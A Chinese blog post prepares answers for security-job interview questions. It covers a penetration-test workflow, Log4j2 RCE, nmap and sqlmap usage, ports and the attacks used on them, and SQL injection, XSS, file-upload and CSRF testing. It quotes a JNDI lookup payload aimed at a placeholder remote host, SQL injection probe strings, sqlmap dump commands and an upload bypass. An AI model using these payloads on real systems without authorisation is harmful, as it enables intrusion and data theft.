@@ -1,0 +1,782 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>东奥护网项目面试问题.md | Cloudyun</title><meta name="keywords" content="网安"><meta name="author" content="Cloudyun"><meta name="copyright" content="Cloudyun"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="护网面试问题准备">
+<meta property="og:type" content="article">
+<meta property="og:title" content="东奥护网项目面试问题.md">
+<meta property="og:url" content="https://cloudyunn.github.io/posts/7.html">
+<meta property="og:site_name" content="Cloudyun">
+<meta property="og:description" content="护网面试问题准备">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s4.ax1x.com/2022/01/09/7kCdnf.png">
+<meta property="article:published_time" content="2022-01-09T09:36:01.000Z">
+<meta property="article:modified_time" content="2022-01-10T08:13:06.124Z">
+<meta property="article:author" content="Cloudyun">
+<meta property="article:tag" content="网安">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s4.ax1x.com/2022/01/09/7kCdnf.png"><link rel="shortcut icon" href="https://z3.ax1x.com/2021/12/02/oNhO9e.png"><link rel="canonical" href="https://cloudyunn.github.io/posts/7"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"一年之内的产物","messageNext":"技术可能存在过期"},
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Cloudyun","link":"链接: ","source":"来源: Cloudyun","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '东奥护网项目面试问题.md',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-10 16:13:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    document.addEventListener('pjax:complete', detectApple)})(window)</script><link defer rel="stylesheet" href="/css/customm.css" ><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/css/icon.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/css/background.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/css/index_ee.css"><meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Cloudyun" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2021/12/21/TK9yTg.jpg" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fa fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/List/movies/"><i class="fa-fw fa fa-film"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/tools/"><i class="fa-fw fa fa-suitcase"></i><span> 百宝箱</span></a></div><div class="menus_item"><a class="site-page" href="/Windows/"><i class="fa-fw fa fa-desktop"></i><span> Windows</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s4.ax1x.com/2022/01/09/7kCdnf.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Cloudyun</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fa fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/List/movies/"><i class="fa-fw fa fa-film"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/tools/"><i class="fa-fw fa fa-suitcase"></i><span> 百宝箱</span></a></div><div class="menus_item"><a class="site-page" href="/Windows/"><i class="fa-fw fa fa-desktop"></i><span> Windows</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">东奥护网项目面试问题.md</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-09T09:36:01.000Z" title="发表于 2022-01-09 17:36:01">2022-01-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-10T08:13:06.124Z" title="更新于 2022-01-10 16:13:06">2022-01-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%A4%E7%BD%91/">护网</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="东奥护网项目面试问题.md"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>准备提前记录一下东奥护网行动面试可能会问的一些问题，以及对应的简要想法和答案</p>
+<h2 id="先介绍下你的技术情况"><a href="#先介绍下你的技术情况" class="headerlink" title="先介绍下你的技术情况"></a>先介绍下你的技术情况</h2><p>​    熟练使用kali，包括但不仅限于以下工具：Metasploit、Nessus、burpsuite、nmap、sqlmap、beef等，还有些工具类似：Aircrack-ng（wifi网络监控、信息获取、破坏等功能）、hydra（协议爆破）了解基础使用用法。</p>
+<p>​    熟悉owasp top10，熟悉DVWA靶场上相关漏洞的愿一力以及漏洞利用方式。熟悉一些简单的网站漏洞，原理查询以及利用。</p>
+<h2 id="如果让你渗透一个网站，你的思路是什么？"><a href="#如果让你渗透一个网站，你的思路是什么？" class="headerlink" title="如果让你渗透一个网站，你的思路是什么？"></a>如果让你渗透一个网站，你的思路是什么？</h2><ul>
+<li><p>1、前期交互：客户需求、测试计划、目标、范围、条件等等（回答可以略过）</p>
+</li>
+<li><p>2、信息收集</p>
+<ul>
+<li><p>（1）服务器相关信息（真实IP、系统类型、版本、开放端口、WAF等），个人一般用shodan看基本信息。</p>
+</li>
+<li><p>（2）网站指纹识别（cms、cdn证书等），dns记录</p>
+</li>
+<li><p>（3）whois信息，姓名、备案、邮箱、电话反差等，为后面社会工程学准备</p>
+</li>
+<li><p>（4）子域名收集（google hack的site）：旁站查询、C段等，先看看旁站有没有通用性的cms或者其他漏洞，主站一般比较难。</p>
+<ul>
+<li><blockquote>
+<p>CMS使用判别：应用程序的文件中出现的特征码来快速识别是哪一个CMS，在进行漏洞查找利用。或者利用一些工具来扫，例如御剑WEB指纹识别工具、cmscan</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>（5）Google hack进一步探测网站的信息、后台、敏感文件</p>
+<ul>
+<li><blockquote>
+<p>site:    指定域名</p>
+<p>intext:    正文中关键字</p>
+<p>intitle:    标题中关键字</p>
+<p>info：    基本信息</p>
+<p>inurl：    URL存在关键字</p>
+<p>filetype：    指定文件类型</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>（6）扫网站目录结构、爆后台，网站banner、测试文件、备份等敏感文件泄露等，如php探针。</p>
+<blockquote>
+<ul>
+<li>常用工具：御剑后台扫描工具、burp、dirbuster等</li>
+</ul>
+</blockquote>
+</li>
+<li><p>（7）传输协议，通用漏洞，exp</p>
+</li>
+<li><p>（8）查看IP、指定IP端口扫描、对响应端口进行漏洞探测、例如samba、mysql、ftp、ssh、心脏出血等。</p>
+</li>
+</ul>
+</li>
+<li><p>3、漏洞挖掘</p>
+<ul>
+<li>（1）浏览网站结构，了解规模、功能、特点</li>
+<li>（2）端口、弱口令、目录扫描</li>
+<li>（3）XSS、SQL、命令注入、CSRF、cookie安全检测、暴力破解、敏感信息、文件包含、任意文件上传、重放攻击等，个人习惯一般先针对特定特点手动尝试，再用Nessus等漏洞扫描工具。</li>
+</ul>
+</li>
+<li><p>4、漏洞利用</p>
+<ul>
+<li>利用前面方式getshell、webshell或者其他权限后，<strong>权限提升</strong>。可以使用mysql、windows低版本漏洞、linux内核版本漏洞提权。</li>
+</ul>
+</li>
+<li><p>5、清除测试数据、输出报告</p>
+<ul>
+<li>（1）日志、测试数据的清理</li>
+<li>（2）总结，形成渗透测试报告、修复方案等。</li>
+</ul>
+</li>
+</ul>
+<h2 id="说一些近段时间你了解的漏洞"><a href="#说一些近段时间你了解的漏洞" class="headerlink" title="说一些近段时间你了解的漏洞"></a>说一些近段时间你了解的漏洞</h2><ul>
+<li><p>1、2021.11.24阿里云安全团队披露的Apache Log4j2远程代码执行漏洞(RCE)</p>
+<blockquote>
+<p>Apache Log4j2是一款优秀的Java日志框架，广泛应用于<strong>中间件、开发框架与Web应用</strong>中，用来记录日志信息。由于其作为<strong>基础组件</strong>广泛应用于很多Java框架和项目中，影响了数以万计的应用，因此绝大多数使用Java项目的公司都会被波及。 </p>
+<p>影响应用及组件：Apache Solr、Apache Struts2、Apache Flink、Apache Druid、spring-boot-strater-log4j2等等</p>
+<p>由于Apache Log4j2某些功能存在递归解析功能，攻击者就可以直接构造恶意请求，触发远程代码执行漏洞，漏洞的poc已被公开，默认配置就可以进行利用（无需特殊环境）</p>
+<p>原理：漏洞成因在于log4j2提供的<strong>lookup</strong>功能。日志中包含 ${}，lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。其中的<strong>JNDI</strong>就是利用的主题，因为其解析未做限制，可以直接访问到远程对象，当记录日志的一部分是用户可控时，就可以构造恶意字符串使服务器记录日志时调用JNDI访问恶意对象，也就是流传出的payload构成：</p>
+</blockquote>
+</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202201101050307.jpeg"></p>
+<blockquote>
+<p>攻击思路：</p>
+<ul>
+<li>（1）找到目标服务器记录日志的地方，且记录的部分内容可控</li>
+<li>（2）搭建RMI服务器，包含需要执行的恶意代码</li>
+<li>（3）构建EXP触发目标服务器进行日志记录触发JNDI解析</li>
+<li>（4）解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码</li>
+</ul>
+</blockquote>
+<h2 id="以前挖过哪些网站的漏洞"><a href="#以前挖过哪些网站的漏洞" class="headerlink" title="以前挖过哪些网站的漏洞"></a>以前挖过哪些网站的漏洞</h2><p>DVWA靶场几乎所有的漏洞、课题组网站的漏洞（sql注入）</p>
+<h2 id="说几个你比较常用的工具"><a href="#说几个你比较常用的工具" class="headerlink" title="说几个你比较常用的工具"></a>说几个你比较常用的工具</h2><ul>
+<li>nmap</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">-sT									TCP connect扫描，最基本的方式，很容易被检测
+-sS									TCP SYN同步扫描，为半开扫描，很少有系统能记入日志。
+-sV									版本探测
+-sA									ACK扫描，通常可以穿过防火墙
+-sW									滑动窗口扫描，类似sA
+-sR									RPC扫描，和其他不同扫描方法结合使用
+-sM									TCP	Maimon扫描
+
+-p	20-30/139/60000					指定端口扫描
+-P-									扫描0-65535全部端口
+-P0									扫描之前不ping主机
+-Pn									选项指示NMAP跳过默认的发现检查并对执行对目标的完整端口扫								描。当扫描被阻止ping探针的防火墙保护的主机时，这是非常有用的
+-n									禁用反向DNS解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>sqlmap</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap	-u	"http://www.xx.com?id=x"		查询是否有诸如点
+--dbs										检测站点包含哪些数据库
+--current-db								获取当前数据库名
+--tables -D “db_name”						获取指定数据库表名
+--columns  -T "table_name" -D "db_name"		获取数据库表中的字段
+--dump -C "columns_name" -T "table_name" -D "db_name"	获取字段的数据内容
+
+--cookie "cookie" --level 2					coockie注入，后接coockie值
+--threads									线程，最高为10
+
+post注入：
+（1）目标地址http:// www.xxx.com /login.asp
+（2）打开burp代理。
+（3）点击表单提交
+（4）burp获取拦截信息（post）
+（5）右键保存文件（.txt）到指定目录下
+（6）运行sqlmap并执行如下命令：sqlmap -r okay.txt  -p  username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="常见端口号及相关服务、漏洞"><a href="#常见端口号及相关服务、漏洞" class="headerlink" title="常见端口号及相关服务、漏洞"></a>常见端口号及相关服务、漏洞</h2><table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+<th>入侵方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>21</td>
+<td>ftp/tftp/vsftpd文件传输协议</td>
+<td>爆破/嗅探/溢出/后门——vsftpd漏洞</td>
+</tr>
+<tr>
+<td><strong>22</strong></td>
+<td>ssh远程连接</td>
+<td>爆破/openssh漏洞</td>
+</tr>
+<tr>
+<td><strong>23</strong></td>
+<td>Telnet远程连接</td>
+<td>爆破/嗅探/弱口令</td>
+</tr>
+<tr>
+<td>25</td>
+<td>SMTP邮件服务</td>
+<td>邮件伪造</td>
+</tr>
+<tr>
+<td>53</td>
+<td>DNS域名解析系统</td>
+<td>域传送/劫持/缓存投毒/欺骗</td>
+</tr>
+<tr>
+<td>67/68</td>
+<td>dhcp服务</td>
+<td>劫持/欺骗</td>
+</tr>
+<tr>
+<td>110</td>
+<td>pop3</td>
+<td>爆破/嗅探</td>
+</tr>
+<tr>
+<td><strong>139</strong></td>
+<td>samba服务</td>
+<td>爆破/未授权访问/RCE</td>
+</tr>
+<tr>
+<td>161</td>
+<td>SNMP协议</td>
+<td>爆破/搜集目标内网信息</td>
+</tr>
+<tr>
+<td><strong>445</strong></td>
+<td>smb，也是一种TCP端口，win低版本和139相同</td>
+<td>ms17-010/端口溢出</td>
+</tr>
+<tr>
+<td>1080</td>
+<td>socket</td>
+<td>爆破</td>
+</tr>
+<tr>
+<td>1443</td>
+<td>SQLserver的默认端口</td>
+<td>爆破/注入/SA弱口令</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>oracle</td>
+<td>爆破/注入/TNS爆破/反弹shell</td>
+</tr>
+<tr>
+<td>2375</td>
+<td>docker remote api</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>mysql的默认端口</td>
+<td>爆破/注入</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>RDP远程桌面连接</td>
+<td>爆破/shift后门</td>
+</tr>
+<tr>
+<td>7001</td>
+<td>weblogic</td>
+<td>java反序列化漏洞/控制台弱口令</td>
+</tr>
+<tr>
+<td>8080/89</td>
+<td>Jboss/Tomcat/Resin</td>
+<td>爆破/反序列化/PUT文件上传</td>
+</tr>
+</tbody></table>
+<h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>sql，Structured Query Language，叫做结构化查询语言，管理数据库时用到的一种语言。</p>
+<p>SQL注入，即把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，主要原因是程序没有细致地过滤用户地数据，致使非法数据侵入系统。</p>
+<h2 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h2><p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还 原成对象。如果Java（PHP）应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意 输入，让反序列化产生<strong>非预期的对象</strong>，非预期的对象在产生过程中就有可能带来任意代码执行</p>
+<p>Java中：ObjectOutputStream类的writeObject()方法、ObjectInputStream类的readObject()方法</p>
+<p>PHP中：serialize()和unserialize()两个函数</p>
+<p>问题的根源在于类ObjectInputStream在反序列化时，没有<strong>对生成的对象的类型做限制</strong>；假若反序列化可以设置Java类型的白名单，则不会有如此大的影响。</p>
+<h2 id="如何去测试SQL注入-反序列化-XSS-文件上传-越权漏洞"><a href="#如何去测试SQL注入-反序列化-XSS-文件上传-越权漏洞" class="headerlink" title="如何去测试SQL注入/反序列化/XSS/文件上传/越权漏洞"></a>如何去测试SQL注入/反序列化/XSS/文件上传/越权漏洞</h2><ul>
+<li>SQL注入：</li>
+</ul>
+<p>通过查看回显，来判断能不能进行sql注入，是哪种sql注入：数字型？字符型？</p>
+<pre class="line-numbers language-none"><code class="language-none">?id=1 and 1=1 返回成功
+?id=1 and 1=2 返回失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>有回显则是数字型</p>
+<pre class="line-numbers language-none"><code class="language-none">?id=1' and '1'='1	返回成功
+?id=1' and '1'='2	返回失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>这就是字符型</p>
+<blockquote>
+<p>搜索<code>'</code>，如果出错，说明90%存在这个漏洞</p>
+<p>搜索<code>%</code>，如果正常返回，说明95%有洞了</p>
+<p>搜索一个关键字，比如<code>test</code>，正常返回所有test相关的信息</p>
+<p>再搜索<code>test%'and 1=1 and '%'='</code>和<code>test%'and 1=2 and '%'='</code></p>
+</blockquote>
+<p>常用：先用万能密码尝试下，类似’ or 1=’1这种，先用order by猜列数，猜成功后爆数据库、数据表、列、数据等。</p>
+<ul>
+<li>反序列化：</li>
+</ul>
+<p>反序列化操作一般在导入模版文件、网络通信、数据传输、日志格式化存储、对象数据落磁 盘或DB存储等业务场景，在代码审计时可重点关注一些反序列化操作函数并判断输入是否可控</p>
+<ul>
+<li>XSS：</li>
+</ul>
+<p>在网站输入框，通过script,img,body等标签，能够插入js语句，表示存在漏洞，比如说alert</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;alert(/xss/)&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>文件上传漏洞：</li>
+</ul>
+<p>简单的过滤可能在前端，在上传文件的后利用burp拦截，然后将文件后缀名改为.php，如果上传成功，证明存在漏洞 将一句话木马植入图片文件中，上传，成功则存在。</p>
+<ul>
+<li>越权漏洞：</li>
+</ul>
+<p>通过正确的账号密码登录，利用burp拦截请求包，发送到repeater里，修改里面的关于id的 内容，根据返回值判断是否获得其他账户信息</p>
+<h2 id="文件上传漏洞的绕过方法有哪些"><a href="#文件上传漏洞的绕过方法有哪些" class="headerlink" title="文件上传漏洞的绕过方法有哪些"></a>文件上传漏洞的绕过方法有哪些</h2><p>在文件名后面加上满足上传文件需求的后缀名 上传文件时使用burp拦截，在前端上传成功后在burp里将文件名后缀修改成.php 将一句话木马插入到需要上传的文件中。</p>
+<h2 id="SQL注入漏洞有哪些利用手法"><a href="#SQL注入漏洞有哪些利用手法" class="headerlink" title="SQL注入漏洞有哪些利用手法"></a>SQL注入漏洞有哪些利用手法</h2><p>联合查询（union select）</p>
+<p>报错注入：注入特殊的语句使报错回显中带上我们需要的信息，常见的报错回显有三种函数extractvalue()、update<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=xml">xml</a>()、floor()。</p>
+<p>布尔盲注：将我们要获取的信息与猜测信息进行比对，正确页面正常，错误时与正确页面有区别。在布尔盲注时我们通常会使用到length()、substr()、ascll()。</p>
+<p>延时注入（sleep、if）：注入延时回显参数，根据是否延时来判断语句执行是否正确</p>
+<h2 id="比较喜欢用哪几种工具，它们的优势是什么"><a href="#比较喜欢用哪几种工具，它们的优势是什么" class="headerlink" title="比较喜欢用哪几种工具，它们的优势是什么"></a>比较喜欢用哪几种工具，它们的优势是什么</h2><ul>
+<li>burpsuite：功能强大，可以实现拦截，代理，爆破等功能，还可以加载各种插件</li>
+<li>nmap：方便的查询接口及其状态</li>
+<li>sqlmap：使用比较方便，可以轻松实现sql盲注。有自带的tamper，但有的时候需要手动编写来绕过一些过滤。</li>
+</ul>
+<h2 id="CSRF漏洞的原理"><a href="#CSRF漏洞的原理" class="headerlink" title="CSRF漏洞的原理"></a>CSRF漏洞的原理</h2><p>跨站请求伪造（Cross Site Request Forgery，CSRF）</p>
+<ul>
+<li>目标用户使用其用户名和密码登录受信任站点，从而创建了一个新的会话，受信任站点则会为目标用户Web浏览器Cookie中的会话信息存储了会话标示符。</li>
+<li>测试者往Web应用页面中插入恶意的HTML链接或脚本代码，而目标页面又没有过滤或者过滤不严，那么当用户浏览该页面时，用户的Web浏览器将被操纵向受信任站点发送一个恶意请求，比如删除帖子、添加管理员、添加邮件转发规则、改变路由器的DNS设置等。</li>
+<li>Web浏览器将会为这个恶意请求自动附加会话Cookie信息，因为是访问的受信任站点，因此该恶意请求将会成功完成。</li>
+</ul>
+<p>与XSS相比：</p>
+<ul>
+<li>XSS：利用用户对站点的信任，攻击者通过注入程序来修改网站来使用户浏览器被重定向等</li>
+<li>CSRF：利用站点对已经身份认证的用户的信任，攻击者伪造一个链接误导用户点击链接来使用用户的身份认证来访问服务器</li>
+</ul>
